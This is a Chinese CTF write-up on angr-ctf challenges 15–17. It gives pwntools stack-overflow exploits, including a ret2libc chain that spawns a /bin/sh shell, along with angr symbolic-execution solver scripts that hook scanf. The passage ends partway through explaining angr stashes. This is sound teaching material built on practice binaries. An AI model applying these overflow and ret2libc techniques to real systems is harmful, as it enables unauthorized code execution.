<h1 id="0x07-angr-ctf：漏洞利用"><a href="#0x07-angr-ctf：漏洞利用" class="headerlink" title="0x07. angr-ctf：漏洞利用"></a>0x07. angr-ctf：漏洞利用</h1><h2 id="15-angr-arbitrary-read：栈溢出变量覆盖"><a href="#15-angr-arbitrary-read：栈溢出变量覆盖" class="headerlink" title="15_angr_arbitrary_read：栈溢出变量覆盖"></a>15_angr_arbitrary_read：栈溢出变量覆盖</h2><p>惯例拖入 IDA，逻辑比较简单，如果第一个数不是 42698355 或者第一个数是 9507730 就输出 <code>&quot;Try again.&quot;</code> ，否则输出 s 字符串，而在读入到 v4 时存在一个栈溢出可以覆盖 s 指针，因此我们可以让其输出指定地址上的字符串</p>
<p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>而众所周知 angr-ctf 当中的题目都要我们输出 <code>&quot;Good Job.&quot;</code> 字符串，我们在 IDA 中可以很容易找到他的地址，所以最后的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p>
<p>那么用 angr 该怎么做呢？一开始笔者也没太想明白，后面想到既然输入的长度是已知的，那么我们可以使用 SimProcedure 来 hook 掉 scanf，将输入作为符号位向量进行求解，同时我们应当为第二个输入字符串中的每个字符添加成可见字符的约束</p>
<p>那么这里我们可以使用 <code>BVS.chop(bits=n)</code> 来将符号位向量按照一定尺寸进行分割，于是最后的模拟 scanf 写法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure>

<p>接下来我们需要判断我们的符号化向量是否获得了我们预期中的结果，我们这一次将路径探索的终结点放在 <code>puts()</code>，并判断其参数是否为 <code>&quot;Good Job.&quot;</code> 字符串的地址：</p>
<ul>
<li>使用 <code>state.memory.load()</code> 将 <code>puts()</code> 的参数提取出来</li>
<li>使用 <code>state.solver.symbolic()</code> 判断 <code>puts()</code> 的参数是否是我们的 BVS</li>
<li>使用 <code>state.copy()</code> 获取当前状态的副本，之后在该副本上添加约束以避免影响到原状态</li>
<li>使用 <code>state.satisfiable()</code> 判断是否满足约束，若是则添加到原状态中求解即可</li>
</ul>
<p>方便起见，这里笔者将搜索的地址设为 <code>puts()</code> 函数的 plt 表地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure>

<p>除了通过复制状态后添加约束并判断的方法以外，我们也可以通过为 <code>state.satisfiable()</code> 指定 <code>extra_constraints</code> 参数的方式来在不影响状态本身已有约束集的状态下进行约束判断，因此上面的 is_success() 函数也可以写成如下形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure>



<p>将上面的进行整合就是我们最后的 exp 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>运行即可成功输出 <code>&quot;Good Job.&quot;</code>：</p>
<p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="16-angr-arbitrary-write：栈溢出变量覆盖"><a href="#16-angr-arbitrary-write：栈溢出变量覆盖" class="headerlink" title="16_angr_arbitrary_write：栈溢出变量覆盖"></a>16_angr_arbitrary_write：栈溢出变量覆盖</h2><p>还是惯例地拖入 IDA，本题逻辑主要是读入输入后判断 key 是否是 <code>10225924</code>，若是则拷贝字符串 <code>s</code> 到 <code>dest</code> 所指字符串，否则拷贝到 <code>unimporttant_buffer</code>，最后判断 <code>password_buffer</code> 是否为 <code>&quot;UEQFKBEC&quot;</code>，若是则输出 <code>&quot;Good Job.&quot;</code> 字符串：</p>
<p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>和上一题类似，本题的输入读入同样存在一个溢出，可以让我们覆盖到 <code>dest</code> ，我们不难想到的是若是将 <code>dest</code> 覆盖为 <code>password_buffer</code> 的地址，便能直接覆写其中的内容</p>
<p>于是最后的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p>
<p>那么用 angr 该怎么做呢？这题其实和上一道题本质上是一样的，我们同样可以通过 hook scanf 的方式来将我们的输入符号化，之后在 <code>explore()</code> 中设置一个在 <code>strncpy()</code> 上进行判断的函数——判断其第一个参数是否为 <code>password_buffer</code>、第二个参数是否为 <code>&quot;UEQFKBEC&quot;</code> 即可</p>
<p>最终的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>运行即可获得 <code>&quot;Good Job.&quot;</code></p>
<p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>笔者感觉这两题基本上一模一样…不知道为啥特地分成两道题-  -</p>
</blockquote>
<h2 id="17-angr-arbitrary-jump：栈溢出劫持控制流"><a href="#17-angr-arbitrary-jump：栈溢出劫持控制流" class="headerlink" title="17_angr_arbitrary_jump：栈溢出劫持控制流"></a>17_angr_arbitrary_jump：栈溢出劫持控制流</h2><p>angr-CTF 的最后一道题了，还是惯例拖入 IDA 中，这一次的核心逻辑在 <code>read_input()</code> 当中，而该函数仅为一个简单的 <code>&quot;%s&quot;</code> 溢出：</p>
<p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>checksec 一下，只开了一个 NX：</p>
<p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>直接打一套 ret2libc 组合拳：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>运行即可 Get shell：</p>
<p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>——但在 angr-CTF 中实际上要求我们输出的是 <code>&quot;Good Job.&quot;</code> 字符串：(</p>
<p>重新再看一下 IDA，我们可以找到一个名为 <code>print_good()</code> 的函数，其会输出 <code>&quot;Good Job.&quot;</code> 字符串</p>
<p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么我们直接将返回地址覆盖为该函数即可，exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p>
<p>那么用 angr 该怎么做呢？首先我们不难想到的是我们还是可以利用 SimProcedure 来 hook scanf 以将输入符号化，由于输入存在溢出，那么我们可以假装不知道输入到栈底的距离，直接将符号化输入设为一个较大长度，若无解再继续增长即可</p>
<p>但这里我们需要完成的是利用栈溢出来控制程序进行跳转，对于 angr 而言这样的状态是<strong>不受约束的状态</strong>（<strong>unconstrained state</strong>），<strong>会被自动丢弃</strong>，因此我们还需要想办法让 angr 保留这样的状态</p>
<h3 id="angr-stash"><a href="#angr-stash" class="headerlink" title="angr stash"></a>angr stash</h3><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等</p>
<h4 id="①-stash-类型"><a href="#①-stash-类型" class="headerlink" title="① stash 类型"></a>① stash 类型</h4><p>在 angr 当中一共有以下几种 stash：</p>
<ul>
<li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li>
<li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li>
